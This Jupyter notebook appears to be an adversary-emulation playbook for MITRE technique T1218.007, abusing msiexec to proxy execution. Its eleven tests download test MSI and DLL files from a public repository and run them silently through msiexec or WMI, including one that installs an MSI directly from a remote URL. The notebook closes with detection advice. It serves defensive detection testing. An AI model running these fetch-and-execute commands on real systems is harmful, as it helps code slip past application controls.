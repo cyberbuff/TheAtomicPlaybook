{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "68d68700",
   "metadata": {},
   "source": "# T1218.007 - Msiexec\nAdversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)"
  },
  {
   "cell_type": "markdown",
   "id": "8205156c",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "419eb360",
   "metadata": {},
   "source": "### Atomic Test #1 - Msiexec.exe - Execute Local MSI file with embedded JScript\nExecutes an MSI containing embedded JScript code using msiexec.exe\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The MSI file must exist on disk at specified location (#{msi_payload})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ddb94147",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1d2de365",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nc:\\windows\\system32\\msiexec.exe /q /i \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2977ee33",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "47557001",
   "metadata": {},
   "source": "### Atomic Test #2 - Msiexec.exe - Execute Local MSI file with embedded VBScript\nExecutes an MSI containing embedded VBScript code using msiexec.exe\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The MSI file must exist on disk at specified location (#{msi_payload})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c7f6fa6a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6bab0d63",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nc:\\windows\\system32\\msiexec.exe /q /i \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bcfbf6ca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "e21fb9ca",
   "metadata": {},
   "source": "### Atomic Test #3 - Msiexec.exe - Execute Local MSI file with an embedded DLL\nExecutes an MSI containing an embedded DLL using msiexec.exe\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The MSI file must exist on disk at specified location (#{msi_payload})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cda5772d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "90f7c598",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nc:\\windows\\system32\\msiexec.exe /q /i \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8d9ab2fa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "9ed159c4",
   "metadata": {},
   "source": "### Atomic Test #4 - Msiexec.exe - Execute Local MSI file with an embedded EXE\nExecutes an MSI containing an embedded EXE using msiexec.exe\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The MSI file must exist on disk at specified location (#{msi_payload})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d42b8f36",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2b256e81",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nc:\\windows\\system32\\msiexec.exe /q /i \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4485c96",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "5622dbf0",
   "metadata": {},
   "source": "### Atomic Test #5 - WMI Win32_Product Class - Execute Local MSI file with embedded JScript\nExecutes an MSI containing embedded JScript code using the WMI Win32_Product class\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The MSI file must exist on disk at specified location (#{msi_payload})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1474c1d6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "643acecd",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi' }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ff619bcb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "8cfe47fd",
   "metadata": {},
   "source": "### Atomic Test #6 - WMI Win32_Product Class - Execute Local MSI file with embedded VBScript\nExecutes an MSI containing embedded VBScript code using the WMI Win32_Product class\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The MSI file must exist on disk at specified location (#{msi_payload})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6c86f8a6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e513d9de",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi' }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e2ebe6a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "82f2464b",
   "metadata": {},
   "source": "### Atomic Test #7 - WMI Win32_Product Class - Execute Local MSI file with an embedded DLL\nExecutes an MSI containing an embedded DLL using the WMI Win32_Product class\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The MSI file must exist on disk at specified location (#{msi_payload})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c906b9b4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ed2ec0ae",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi' }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "df2618ed",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "66ab6ebe",
   "metadata": {},
   "source": "### Atomic Test #8 - WMI Win32_Product Class - Execute Local MSI file with an embedded EXE\nExecutes an MSI containing an embedded EXE using the WMI Win32_Product class\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The MSI file must exist on disk at specified location (#{msi_payload})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "819ea5ae",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "90470efb",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi' }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0ca88cd6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "fb8d7491",
   "metadata": {},
   "source": "### Atomic Test #9 - Msiexec.exe - Execute the DllRegisterServer function of a DLL\nLoads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The DLL must exist on disk at specified location (#{dll_payload})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e6b6497",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "739f6e46",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nc:\\windows\\system32\\msiexec.exe /y \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a49e0189",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "2828523a",
   "metadata": {},
   "source": "### Atomic Test #10 - Msiexec.exe - Execute the DllUnregisterServer function of a DLL\nLoads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The DLL must exist on disk at specified location (#{dll_payload})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d9c19e00",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c61a3e37",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nc:\\windows\\system32\\msiexec.exe /z \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7473b299",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "d9a0f530",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Msiexec.exe - Execute Remote MSI file",
    "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nc:\\windows\\system32\\msiexec.exe /q /i \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "044d8ae4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.007 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "6e42a0be",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}